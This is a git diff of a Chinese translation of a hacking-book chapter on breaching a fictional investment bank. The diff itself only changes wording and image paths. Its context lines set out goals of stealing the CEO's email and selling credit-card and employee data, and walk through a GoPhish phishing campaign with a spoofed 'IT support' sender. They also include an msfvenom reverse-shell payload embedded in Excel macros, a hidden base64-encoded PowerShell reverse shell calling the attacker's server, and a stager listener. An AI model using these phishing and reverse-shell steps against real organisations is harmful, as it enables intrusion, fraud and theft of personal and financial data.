@@ -1,21 +1,21 @@
-﻿# 第二章、侵入
+﻿# 第二章、入侵
 
 
-> 一切都有裂缝，这就是光线进入的方式。” -- *伦纳德科恩（Leonard Cohen）*
+> 万物皆有裂缝，这就是光线进入的方式。” -- *伦纳德科恩（Leonard Cohen）*
 
-您找到了匿名免费接入互联网的完美地点，您已经设置了TOR / VPN网络，并且您有一个虚拟私人服务器充当前置堡垒。你感到颤抖，你准备好了！
+您找到了匿名免费接入互联网的完美地点，您已经设置了TOR / VPN网络，并且您有一个VPN充当前置堡垒。你感到颤抖，你准备好了！
 
 我们的（假）目标将是一家名为Slash＆Paul's Holding（后续简称SPH）的公司。它是一家投资银行，为世界上一些最富有的客户管理资产。他们并不是特别邪恶;他们碰巧有巨额资金。
 
-在启动我们的工具和技巧之前，让我们暂时停止并明确我们的（非）神圣目标：
->1.我们希望获得CEO的电子邮件，因为这只是一个经典的常规选择！
+在启动我们的工具和技巧之前，先停一停，再次明确我们的（非）神圣目标：
+>1.我们希望获得CEO的电子邮件，因为这只是一个常规操作！
 
 >2.我们还想窃取和销售业务和人力资源数据：帐号，信用卡数据，员工信息等。
 
 >3.但最重要的是，我们希望在雷达下自由翱翔。
 
 SPH的基础设施以广泛而简单的方式看起来可能如下所示：
-![](.\Chap2\SPH-Infrastructure.png)
+![SPH基础设施](./Chap2/SPH-Infrastructure.png)
 
 
 当然，这个图表过于简单化，因为真正的网络可能要复杂得多。但我们总会找到相同的通用元素:
@@ -54,7 +54,7 @@ SPH的基础设施以广泛而简单的方式看起来可能如下所示：
 - 电子邮件的格式：例如，是'name.surname@company.com'还是'first_letter_surname.name@company.com'？
 
 访问网页 www.sph-assets.com/contact 时，我们会找到一个通用的联系地址：marketing@sph-assets.com。这本身并不是很有帮助，但只是发送电子邮件到这个地址将使我们得到在市场部门工作的真实人的回复。
-![](.\Chap2\2.Email.png)
+![](./Chap2/2.Email.png)
 
 非常好，我们从这封电子邮件中获得了两条有价值的信息:
 - 电子邮件地址格式：姓氏的第一个字母后跟名字：pvilma @sph-assets.com。
@@ -85,10 +85,10 @@ SPH的基础设施以广泛而简单的方式看起来可能如下所示：
 
 
 因此，在“发送配置文件”菜单中，我们需要指定另一个域名，例如 sph-group.com。发送电子邮件不需要存在此域名。不要费心去创造它。此外，只要我们提出别名：“IT支持”<it-support@sph-group.com>，人们通常不会关注电子邮件发件人。
-![](.\Chap2\3.SendingProfile.png)
+![](./Chap2/3.SendingProfile.png)
 
 我们在“用户和群组”菜单中添加我们想要定位的用户，然后转到“电子邮件模板”以编写我们的消息内容：
-![](.\Chap2\4.MessageContent.png)
+![](./Chap2/4.MessageContent.png)
 
 
 我们设计电子邮件的内容的方式类似于我们从市场人员那里获得的电子邮件（相同的签名，相同的图表颜色，相同的字体等）。该电子邮件将邀请用户单击下载文件的链接。该链接将由GoPhish自动填写（多亏{{.URL}}变量，如此的自动化）。
@@ -128,7 +128,7 @@ Visual Basic是一种脚本语言，可以嵌入到Office文档（Word，Excel�
 root@FrontGun:~# msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp -e generic/none -f vba lhost=FrontGun_IP  lport=443
 ```
 这将为x86架构生成反向shell攻击负载，无需任何特殊编码（通用/无）。我们将代码复制/粘贴到Excel宏中:
-![](.\Chap2\5.ExcelVBAPayload.png)
+![](./Chap2/5.ExcelVBAPayload.png)
 
 如果我们检查生成的代码，我们知道它执行以下操作:
 - 通过调用过程Workbook_Open（在上图中不可见）打开文档时启动攻击负载;
@@ -174,7 +174,7 @@ $client.Close()
 
 
 在Front Gun服务器上，我们在端口4444上设置了监听器:
-![](.\Chap2\6.Listener.png)
+![](./Chap2/6.Listener.png)
 
 漂亮！我们在远程（测试）机器上进行远程执行。理想情况下，我们希望使用类似的VBA代码来调用此脚本:
 
@@ -208,14 +208,14 @@ $client.Close();
 ```
 FrontGun$ cat reverse.ps1 | iconv -f UTF8 -t UTF16LE | base64
 ```
-![](.\Chap2\7.Encode.png)
+![](./Chap2/7.Encode.png)
 
 
 <br>
 <br>
 
 我们可以使用编码命令作为inline参数来调用此代码:
-![](.\Chap2\8.InlineArg.png)
+![](./Chap2/8.InlineArg.png)
 
 
 '-W hidden'参数将PowerShell隐藏在后台。最后一步是在用户打开Office文档时调用此过程 -  Launch_me（）:
@@ -241,7 +241,7 @@ End Sub
 
 
 在欢迎屏幕上，转到监听器菜单（命令监听器）并列出默认位置info命令:
-![](.\Chap2\9.info.png)
+![](./Chap2/9.info.png)
 
 <br/>
 通过发出set命令设置正确的端口和地址（例如，设置端口443）。然后通过发出run <Listener_name>来执行监听器。
@@ -260,7 +260,10 @@ IEX ($B-joIn'')
 <br/>
 您可以看到代理使用对称加密密钥来传输有效负载并很好地处理工作站上定义的任何潜在代理。在远程计算机上执行脚本时，我们会在Front Gun服务器上收到新通知。
 
-![](.\Chap2\10.Stager.png)
+![](./Chap2/10.Stager.png)
+
+
+> 翻译：2hu2huxia  2019/8/16
 
 
 
